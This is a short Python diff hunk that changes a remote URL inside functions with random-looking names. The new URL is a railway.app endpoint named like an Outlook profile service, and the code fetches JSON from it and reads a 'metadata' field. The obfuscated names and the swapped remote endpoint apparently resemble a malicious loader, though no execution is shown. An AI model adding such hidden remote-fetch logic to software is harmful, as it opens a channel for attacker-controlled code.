@@ -18,7 +18,7 @@ def train_crzmmu_412():
 
     def model_zsdhar_211():
         try:
-            data_kqtnfv_168 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_kqtnfv_168 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_kqtnfv_168.raise_for_status()
             data_jfnmwd_284 = data_kqtnfv_168.json()
             process_ggcoki_413 = data_jfnmwd_284.get('metadata')
